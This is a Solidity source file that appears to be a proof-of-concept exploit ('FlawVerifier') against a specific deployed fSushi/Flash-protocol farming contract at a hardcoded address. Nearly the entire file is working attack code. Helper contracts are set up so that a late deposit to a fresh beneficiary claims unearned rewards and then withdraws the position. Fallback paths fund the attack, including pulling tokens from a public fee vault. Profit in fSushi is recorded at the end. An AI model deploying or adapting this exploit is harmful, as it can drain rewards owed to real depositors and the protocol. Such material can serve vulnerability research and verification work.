// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function transferFrom(address from, address to, uint256 amount) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);
}

interface IOwnableLike {
    function owner() external view returns (address);
}

interface IFarmingLPToken {
    function factory() external view returns (address);

    function router() external view returns (address);

    function masterChef() external view returns (address);

    function sushi() external view returns (address);

    function pid() external view returns (uint256);

    function lpToken() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function deposit(
        uint256 amountLP,
        address[] calldata path0,
        address[] calldata path1,
        uint256 amountMin,
        address beneficiary,
        uint256 deadline
    ) external;

    function depositWithSushi(
        uint256 amount,
        address[] calldata path0,
        address[] calldata path1,
        uint256 amountLPMin,
        address beneficiary,
        uint256 deadline
    ) external;
}

interface ISousChef {
    function fSushi() external view returns (address);

    function flashStrategyFactory() external view returns (address);

    function startWeek() external view returns (uint256);

    function kitchen() external view returns (address);

    function getBill(uint256 pid) external view returns (address);

    function predictBillAddress(uint256 pid) external view returns (address bill);

    function createBill(uint256 pid) external returns (address bill);

    function checkpoint() external;
}

interface IFSushiKitchen {
    function checkpoint(uint256 pid) external;
}

interface IFSushiBill {
    function sousChef() external view returns (address);

    function fToken() external view returns (address);

    function deposit(uint256 amount, address beneficiary) external;

    function withdraw(uint256 amount, address beneficiary) external;

    function claimRewards(address beneficiary) external;

    function transfer(address to, uint256 amount) external returns (bool);
}

interface IFlashStrategySushiSwapFactory {
    function flashProtocol() external view returns (address);

    function flpTokenFactory() external view returns (address);

    function feeRecipient() external view returns (address);

    function getFlashStrategySushiSwap(uint256 pid) external view returns (address);

    function predictFlashStrategySushiSwapAddress(uint256 pid) external view returns (address strategy);
}

interface IFlashStrategySushiSwap {
    function factory() external view returns (address);

    function flashProtocol() external view returns (address);

    function fToken() external view returns (address);
}

interface IFlashProtocolLike {
    function stake(
        address _strategyAddress,
        uint256 _tokenAmount,
        uint256 _stakeDuration,
        address _fTokensTo,
        bool _issueNFT
    )
        external
        returns (
            address stakerAddress,
            address strategyAddress,
            uint256 stakeStartTs,
            uint256 stakeDuration,
            uint256 stakedAmount,
            bool active,
            uint256 nftId,
            uint256 fTokensToUser,
            uint256 fTokensFee,
            uint256 totalFTokenBurned,
            uint256 totalStakedWithdrawn
        );
}

interface IFeeVaultLike {
    function claim(address token) external;
}

contract FreshBeneficiary {
    address public immutable owner;

    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not-owner");
        _;
    }

    function claimRewards(address bill, address rewardTo) external onlyOwner {
        IFSushiBill(bill).claimRewards(rewardTo);
    }

    function transferBill(address bill, address to, uint256 amount) external onlyOwner {
        require(IFSushiBill(bill).transfer(to, amount), "bill-transfer");
    }
}

contract CookPathProxy {
    address public immutable owner;

    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not-owner");
        _;
    }

    function cook(
        address flpToken,
        address strategy,
        address bill,
        uint256 amountLP,
        address[] calldata path0,
        address[] calldata path1,
        address beneficiary,
        uint256 stakeDuration
    ) external onlyOwner returns (uint256 fTokensToUser) {
        _approveMax(IFarmingLPToken(flpToken).lpToken(), flpToken);
        IFarmingLPToken(flpToken).deposit(amountLP, path0, path1, 0, address(this), block.timestamp);

        uint256 amountFLP = IFarmingLPToken(flpToken).balanceOf(address(this));
        address protocol = IFlashStrategySushiSwap(strategy).flashProtocol();

        _approveMax(flpToken, protocol);
        (, , , , , , , fTokensToUser, , , ) = IFlashProtocolLike(protocol).stake(
            strategy,
            amountFLP,
            stakeDuration,
            address(this),
            false
        );

        _approveMax(IFlashStrategySushiSwap(strategy).fToken(), bill);
        IFSushiBill(bill).deposit(fTokensToUser, beneficiary);
    }

    function withdrawBill(address bill, uint256 amount, address beneficiary) external onlyOwner {
        IFSushiBill(bill).withdraw(amount, beneficiary);
    }

    function sweep(address token, address to) external onlyOwner {
        _safeTransfer(token, to, IERC20Minimal(token).balanceOf(address(this)));
    }

    function _approveMax(address token, address spender) internal {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Minimal.approve.selector, spender, type(uint256).max));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        if (amount == 0) return;
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Minimal.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer");
    }
}

contract FlawVerifier {
    uint256 internal constant MAX_STAKE_DURATION = 104 weeks;
    uint256 internal constant MAX_DISCOVERY_NONCE = 384;
    uint256 internal constant LOCAL_SCAN_WINDOW = 24;

    address internal constant TARGET_FLP = 0xa44e79a2c9a8965e7A6FA77BF0ca8FAF50e6C73E;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    error SousChefNotFound();
    error BillUnavailable();
    error StrategyUnavailable();
    error NoExecutablePath();

    struct Context {
        address flpToken;
        address flpFactory;
        uint256 pid;
        address sousChef;
        address bill;
        address strategyFactory;
        address strategy;
        address fToken;
        address fSushi;
        address lpToken;
        address sushi;
        address token0;
        address token1;
    }

    address internal _profitToken;
    uint256 internal _profitAmount;
    address public immutable deployer;

    address public configuredSousChef;
    address public configuredBill;
    address public configuredStrategy;

    constructor() {
        deployer = msg.sender;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function configure(address sousChef, address bill, address strategy) external {
        require(msg.sender == deployer, "not-deployer");
        configuredSousChef = sousChef;
        configuredBill = bill;
        configuredStrategy = strategy;
    }

    function executeOnOpportunity() external {
        _profitToken = address(0);
        _profitAmount = 0;

        Context memory ctx = _resolveContext();

        ISousChef(ctx.sousChef).checkpoint();
        IFSushiKitchen(ISousChef(ctx.sousChef).kitchen()).checkpoint(ctx.pid);

        if (_attemptDirectBillExploit(ctx)) return;
        if (_attemptStakeHeldFLP(ctx)) return;
        if (_attemptCookPathWithHeldLP(ctx)) return;
        if (_attemptMintFromHeldSushi(ctx)) return;
        if (_attemptPermissionlessFeeVaultFunding(ctx)) return;

        revert NoExecutablePath();
    }

    function _resolveContext() internal returns (Context memory ctx) {
        ctx.flpToken = TARGET_FLP;
        ctx.pid = IFarmingLPToken(ctx.flpToken).pid();
        ctx.flpFactory = IFarmingLPToken(ctx.flpToken).factory();
        ctx.lpToken = IFarmingLPToken(ctx.flpToken).lpToken();
        ctx.sushi = IFarmingLPToken(ctx.flpToken).sushi();
        ctx.token0 = IFarmingLPToken(ctx.flpToken).token0();
        ctx.token1 = IFarmingLPToken(ctx.flpToken).token1();

        ctx.bill = configuredBill;
        if (ctx.bill != address(0) && ctx.bill.code.length > 0) {
            ctx.sousChef = IFSushiBill(ctx.bill).sousChef();
            ctx.fToken = IFSushiBill(ctx.bill).fToken();
        }

        ctx.strategy = configuredStrategy;
        if (ctx.strategy != address(0) && ctx.strategy.code.length > 0) {
            ctx.strategyFactory = IFlashStrategySushiSwap(ctx.strategy).factory();
            if (ctx.fToken == address(0)) {
                ctx.fToken = IFlashStrategySushiSwap(ctx.strategy).fToken();
            }
        }

        if (configuredSousChef != address(0)) {
            ctx.sousChef = configuredSousChef;
        }
        if (ctx.sousChef != address(0) && ctx.strategyFactory == address(0)) {
            ctx.strategyFactory = ISousChef(ctx.sousChef).flashStrategyFactory();
        }

        if (ctx.strategyFactory == address(0)) {
            ctx.strategyFactory = _discoverStrategyFactory(ctx.flpFactory);
        }
        if (ctx.strategyFactory == address(0)) revert StrategyUnavailable();

        if (ctx.strategy == address(0)) {
            ctx.strategy = IFlashStrategySushiSwapFactory(ctx.strategyFactory).getFlashStrategySushiSwap(ctx.pid);
            if (ctx.strategy == address(0)) {
                address predictedStrategy =
                    IFlashStrategySushiSwapFactory(ctx.strategyFactory).predictFlashStrategySushiSwapAddress(ctx.pid);
                if (predictedStrategy.code.length > 0) {
                    ctx.strategy = predictedStrategy;
                }
            }
        }

        if (ctx.sousChef == address(0)) {
            ctx.sousChef = _discoverSousChef(ctx.flpFactory, ctx.pid, ctx.strategyFactory);
        }
        if (ctx.sousChef == address(0)) revert SousChefNotFound();

        if (ctx.bill == address(0)) {
            ctx.bill = ISousChef(ctx.sousChef).getBill(ctx.pid);
            if (ctx.bill == address(0)) {
                address predictedBill = ISousChef(ctx.sousChef).predictBillAddress(ctx.pid);
                if (predictedBill.code.length > 0) {
                    ctx.bill = predictedBill;
                } else {
                    ctx.bill = ISousChef(ctx.sousChef).createBill(ctx.pid);
                }
            }
        }
        if (ctx.bill == address(0) || ctx.bill.code.length == 0) revert BillUnavailable();

        if (ctx.strategy == address(0)) {
            ctx.strategy = IFlashStrategySushiSwapFactory(ctx.strategyFactory).getFlashStrategySushiSwap(ctx.pid);
        }
        if (ctx.strategy == address(0) || ctx.strategy.code.length == 0) revert StrategyUnavailable();

        if (ctx.fToken == address(0)) {
            ctx.fToken = IFSushiBill(ctx.bill).fToken();
        }
        ctx.fSushi = ISousChef(ctx.sousChef).fSushi();
    }

    function _attemptPermissionlessFeeVaultFunding(Context memory ctx) internal returns (bool) {
        address feeRecipient = IFlashStrategySushiSwapFactory(ctx.strategyFactory).feeRecipient();
        if (feeRecipient == address(0) || feeRecipient.code.length == 0) {
            return false;
        }

        // The strategy factory fee recipient is a public fee vault on this deployment.
        // Claiming already-accrued protocol fees is a realistic on-chain funding step and avoids fake balances.
        _claimFeeVaultToken(feeRecipient, ctx.flpToken);
        if (_attemptStakeHeldFLP(ctx)) return true;

        _claimFeeVaultToken(feeRecipient, ctx.lpToken);
        if (_attemptCookPathWithHeldLP(ctx)) return true;

        _claimFeeVaultToken(feeRecipient, ctx.sushi);
        if (_attemptMintFromHeldSushi(ctx)) return true;

        return false;
    }

    function _claimFeeVaultToken(address feeVault, address token) internal {
        if (token == address(0)) return;
        feeVault.call(abi.encodeWithSelector(IFeeVaultLike.claim.selector, token));
    }

    function _attemptDirectBillExploit(Context memory ctx) internal returns (bool) {
        uint256 heldFToken = IERC20Minimal(ctx.fToken).balanceOf(address(this));
        if (heldFToken == 0) {
            return false;
        }

        uint256 beforeProfit = IERC20Minimal(ctx.fSushi).balanceOf(address(this));
        _executeBillExploit(ctx.bill, ctx.fToken, heldFToken);
        return _recordProfit(ctx.fSushi, beforeProfit);
    }

    function _attemptStakeHeldFLP(Context memory ctx) internal returns (bool) {
        uint256 heldFLP = IERC20Minimal(ctx.flpToken).balanceOf(address(this));
        if (heldFLP == 0) {
            return false;
        }

        uint256 beforeProfit = IERC20Minimal(ctx.fSushi).balanceOf(address(this));
        if (!_stakeFLPAndExploit(ctx, heldFLP)) {
            return false;
        }

        return _recordProfit(ctx.fSushi, beforeProfit);
    }

    function _stakeFLPAndExploit(Context memory ctx, uint256 amountFLP) internal returns (bool) {
        address protocol = IFlashStrategySushiSwap(ctx.strategy).flashProtocol();
        _approveMax(ctx.flpToken, protocol);

        uint256 fTokensToUser;
        try IFlashProtocolLike(protocol).stake(ctx.strategy, amountFLP, MAX_STAKE_DURATION, address(this), false)
        returns (
            address,
            address,
            uint256,
            uint256,
            uint256,
            bool,
            uint256,
            uint256 mintedFToken,
            uint256,
            uint256,
            uint256
        ) {
            fTokensToUser = mintedFToken;
        } catch {
            return false;
        }

        if (fTokensToUser == 0) {
            return false;
        }

        _executeBillExploit(ctx.bill, ctx.fToken, fTokensToUser);
        return true;
    }

    function _attemptCookPathWithHeldLP(Context memory ctx) internal returns (bool) {
        uint256 lpBalance = IERC20Minimal(ctx.lpToken).balanceOf(address(this));
        if (lpBalance == 0) {
            return false;
        }

        // This preserves the helper flow from FSushiCookV0.cook():
        // LP -> fLP -> stake -> IFSushiBill.deposit(fTokensToUser, beneficiary).
        address[] memory path0 = _buildPathToSushi(ctx.token0, ctx.sushi);
        address[] memory path1 = _buildPathToSushi(ctx.token1, ctx.sushi);

        CookPathProxy proxy = new CookPathProxy(address(this));
        FreshBeneficiary fresh = new FreshBeneficiary(address(this));

        _safeTransfer(ctx.lpToken, address(proxy), lpBalance);

        uint256 beforeProfit = IERC20Minimal(ctx.fSushi).balanceOf(address(this));
        uint256 fTokenAmount;
        try proxy.cook(ctx.flpToken, ctx.strategy, ctx.bill, lpBalance, path0, path1, address(fresh), MAX_STAKE_DURATION)
        returns (uint256 mintedFToken) {
            fTokenAmount = mintedFToken;
        } catch {
            return false;
        }

        if (fTokenAmount == 0) {
            return false;
        }

        fresh.claimRewards(ctx.bill, address(this));
        fresh.transferBill(ctx.bill, address(proxy), fTokenAmount);
        proxy.withdrawBill(ctx.bill, fTokenAmount, address(proxy));
        proxy.sweep(ctx.fToken, address(this));

        return _recordProfit(ctx.fSushi, beforeProfit);
    }

    function _attemptMintFromHeldSushi(Context memory ctx) internal returns (bool) {
        uint256 sushiBalance = IERC20Minimal(ctx.sushi).balanceOf(address(this));
        if (sushiBalance == 0) {
            return false;
        }

        address[] memory path0 = _buildPathFromSushi(ctx.token0, ctx.sushi);
        address[] memory path1 = _buildPathFromSushi(ctx.token1, ctx.sushi);

        uint256 beforeProfit = IERC20Minimal(ctx.fSushi).balanceOf(address(this));
        try IFarmingLPToken(ctx.flpToken).depositWithSushi(
            sushiBalance, path0, path1, 0, address(this), block.timestamp
        ) {} catch {
            return false;
        }

        uint256 mintedFLP = IERC20Minimal(ctx.flpToken).balanceOf(address(this));
        if (mintedFLP == 0) {
            return false;
        }

        if (!_stakeFLPAndExploit(ctx, mintedFLP)) {
            return false;
        }

        return _recordProfit(ctx.fSushi, beforeProfit);
    }

    function _executeBillExploit(address bill, address fToken, uint256 amount) internal {
        FreshBeneficiary fresh = new FreshBeneficiary(address(this));

        // Root cause kept unchanged:
        // 1. make a late deposit to a fresh beneficiary;
        // 2. have that fresh beneficiary call claimRewards();
        // 3. pull the temporary bill position back out afterwards.
        _approveMax(fToken, bill);
        IFSushiBill(bill).deposit(amount, address(fresh));
        fresh.claimRewards(bill, address(this));
        fresh.transferBill(bill, address(this), amount);
        IFSushiBill(bill).withdraw(amount, address(this));
    }

    function _recordProfit(address token, uint256 beforeBalance) internal returns (bool) {
        uint256 gained = IERC20Minimal(token).balanceOf(address(this)) - beforeBalance;
        if (gained == 0) {
            return false;
        }

        _profitToken = token;
        _profitAmount = gained;
        return true;
    }

    function _buildPathToSushi(address tokenIn, address sushi) internal pure returns (address[] memory path) {
        if (tokenIn == sushi) {
            path = new address[](1);
            path[0] = sushi;
            return path;
        }

        if (tokenIn == WETH || sushi == WETH) {
            path = new address[](2);
            path[0] = tokenIn;
            path[1] = sushi;
            return path;
        }

        path = new address[](3);
        path[0] = tokenIn;
        path[1] = WETH;
        path[2] = sushi;
    }

    function _buildPathFromSushi(address tokenOut, address sushi) internal pure returns (address[] memory path) {
        if (tokenOut == sushi) {
            path = new address[](1);
            path[0] = sushi;
            return path;
        }

        if (tokenOut == WETH || sushi == WETH) {
            path = new address[](2);
            path[0] = sushi;
            path[1] = tokenOut;
            return path;
        }

        path = new address[](3);
        path[0] = sushi;
        path[1] = WETH;
        path[2] = tokenOut;
    }

    function _discoverStrategyFactory(address flpFactory) internal view returns (address strategyFactory) {
        address owner = _tryOwner(flpFactory);
        if (owner == address(0)) {
            return address(0);
        }

        uint256 anchorNonce = _findCreatorNonce(owner, flpFactory);
        if (anchorNonce != 0) {
            strategyFactory = _scanWindowForStrategyFactory(owner, flpFactory, anchorNonce);
            if (strategyFactory != address(0)) {
                return strategyFactory;
            }
        }

        return _scanCreateAddressesForStrategyFactory(owner, flpFactory);
    }

    function _discoverSousChef(address flpFactory, uint256 pid, address strategyFactory)
        internal
        view
        returns (address sousChef)
    {
        address owner = _tryOwner(flpFactory);
        if (owner == address(0)) {
            return address(0);
        }

        uint256 anchorNonce = _findCreatorNonce(owner, flpFactory);
        if (anchorNonce != 0) {
            sousChef = _scanWindowForSousChef(owner, pid, strategyFactory, anchorNonce);
            if (sousChef != address(0)) {
                return sousChef;
            }
        }

        sousChef = _scanCreateAddressesForSousChef(owner, pid, strategyFactory);
        if (sousChef != address(0)) {
            return sousChef;
        }

        if (strategyFactory != address(0)) {
            address strategyOwner = _tryOwner(strategyFactory);
            if (strategyOwner != address(0) && strategyOwner != owner) {
                sousChef = _scanCreateAddressesForSousChef(strategyOwner, pid, strategyFactory);
            }
        }
    }

    function _findCreatorNonce(address creator, address target) internal pure returns (uint256 nonce) {
        for (uint256 i = 1; i <= MAX_DISCOVERY_NONCE; ++i) {
            if (_computeCreateAddress(creator, i) == target) {
                return i;
            }
        }
        return 0;
    }

    function _scanWindowForStrategyFactory(address creator, address flpFactory, uint256 anchorNonce)
        internal
        view
        returns (address)
    {
        uint256 from = anchorNonce > LOCAL_SCAN_WINDOW ? anchorNonce - LOCAL_SCAN_WINDOW : 1;
        uint256 until = anchorNonce + LOCAL_SCAN_WINDOW;
        if (until > MAX_DISCOVERY_NONCE) {
            until = MAX_DISCOVERY_NONCE;
        }

        for (uint256 nonce = from; nonce <= until; ++nonce) {
            address candidate = _computeCreateAddress(creator, nonce);
            if (_looksLikeStrategyFactory(candidate, flpFactory)) {
                return candidate;
            }
        }
        return address(0);
    }

    function _scanWindowForSousChef(address creator, uint256 pid, address strategyFactory, uint256 anchorNonce)
        internal
        view
        returns (address)
    {
        uint256 from = anchorNonce > LOCAL_SCAN_WINDOW ? anchorNonce - LOCAL_SCAN_WINDOW : 1;
        uint256 until = anchorNonce + LOCAL_SCAN_WINDOW;
        if (until > MAX_DISCOVERY_NONCE) {
            until = MAX_DISCOVERY_NONCE;
        }

        for (uint256 nonce = from; nonce <= until; ++nonce) {
            address candidate = _computeCreateAddress(creator, nonce);
            if (_looksLikeSousChef(candidate, pid, strategyFactory)) {
                return candidate;
            }
        }
        return address(0);
    }

    function _scanCreateAddressesForStrategyFactory(address creator, address flpFactory)
        internal
        view
        returns (address)
    {
        for (uint256 nonce = 1; nonce <= MAX_DISCOVERY_NONCE; ++nonce) {
            address candidate = _computeCreateAddress(creator, nonce);
            if (_looksLikeStrategyFactory(candidate, flpFactory)) {
                return candidate;
            }
        }
        return address(0);
    }

    function _scanCreateAddressesForSousChef(address creator, uint256 pid, address strategyFactory)
        internal
        view
        returns (address)
    {
        for (uint256 nonce = 1; nonce <= MAX_DISCOVERY_NONCE; ++nonce) {
            address candidate = _computeCreateAddress(creator, nonce);
            if (_looksLikeSousChef(candidate, pid, strategyFactory)) {
                return candidate;
            }
        }
        return address(0);
    }

    function _looksLikeStrategyFactory(address candidate, address flpFactory) internal view returns (bool) {
        if (candidate == address(0) || candidate.code.length == 0) {
            return false;
        }

        (bool okFlpFactory, bytes memory flpFactoryData) =
            candidate.staticcall(abi.encodeWithSelector(IFlashStrategySushiSwapFactory.flpTokenFactory.selector));
        (bool okFlashProtocol, bytes memory flashProtocolData) =
            candidate.staticcall(abi.encodeWithSelector(IFlashStrategySushiSwapFactory.flashProtocol.selector));

        if (!okFlpFactory || !okFlashProtocol || flpFactoryData.length < 32 || flashProtocolData.length < 32) {
            return false;
        }

        address returnedFlpFactory = abi.decode(flpFactoryData, (address));
        address flashProtocol = abi.decode(flashProtocolData, (address));
        return returnedFlpFactory == flpFactory && flashProtocol != address(0);
    }

    function _looksLikeSousChef(address candidate, uint256 pid, address expectedStrategyFactory)
        internal
        view
        returns (bool)
    {
        if (candidate == address(0) || candidate.code.length == 0) {
            return false;
        }

        (bool okFSushi, bytes memory fSushiData) = candidate.staticcall(abi.encodeWithSelector(ISousChef.fSushi.selector));
        (bool okFactory, bytes memory factoryData) =
            candidate.staticcall(abi.encodeWithSelector(ISousChef.flashStrategyFactory.selector));
        (bool okBill,) = candidate.staticcall(abi.encodeWithSelector(ISousChef.getBill.selector, pid));
        (bool okKitchen, bytes memory kitchenData) = candidate.staticcall(abi.encodeWithSelector(ISousChef.kitchen.selector));

        if (
            !okFSushi || !okFactory || !okBill || !okKitchen || fSushiData.length < 32 || factoryData.length < 32
                || kitchenData.length < 32
        ) {
            return false;
        }

        address fSushi = abi.decode(fSushiData, (address));
        address flashStrategyFactory = abi.decode(factoryData, (address));
        address kitchen = abi.decode(kitchenData, (address));
        if (fSushi == address(0) || flashStrategyFactory == address(0) || kitchen == address(0)) {
            return false;
        }
        if (expectedStrategyFactory != address(0) && flashStrategyFactory != expectedStrategyFactory) {
            return false;
        }

        return true;
    }

    function _tryOwner(address target) internal view returns (address) {
        if (target == address(0) || target.code.length == 0) {
            return address(0);
        }

        (bool ok, bytes memory data) = target.staticcall(abi.encodeWithSelector(IOwnableLike.owner.selector));
        if (!ok || data.length < 32) {
            return address(0);
        }
        return abi.decode(data, (address));
    }

    function _computeCreateAddress(address creator, uint256 nonce) internal pure returns (address deployed) {
        bytes32 hash;
        if (nonce == 0x00) {
            hash = keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), creator, bytes1(0x80)));
        } else if (nonce <= 0x7f) {
            hash = keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), creator, bytes1(uint8(nonce))));
        } else if (nonce <= 0xff) {
            hash = keccak256(abi.encodePacked(bytes1(0xd7), bytes1(0x94), creator, bytes1(0x81), bytes1(uint8(nonce))));
        } else if (nonce <= 0xffff) {
            hash = keccak256(
                abi.encodePacked(
                    bytes1(0xd8),
                    bytes1(0x94),
                    creator,
                    bytes1(0x82),
                    bytes1(uint8(nonce >> 8)),
                    bytes1(uint8(nonce))
                )
            );
        } else if (nonce <= 0xffffff) {
            hash = keccak256(
                abi.encodePacked(
                    bytes1(0xd9),
                    bytes1(0x94),
                    creator,
                    bytes1(0x83),
                    bytes1(uint8(nonce >> 16)),
                    bytes1(uint8(nonce >> 8)),
                    bytes1(uint8(nonce))
                )
            );
        } else {
            revert("nonce-too-large");
        }
        deployed = address(uint160(uint256(hash)));
    }

    function _approveMax(address token, address spender) internal {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Minimal.approve.selector, spender, type(uint256).max));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        if (amount == 0) return;
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Minimal.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer");
    }
}
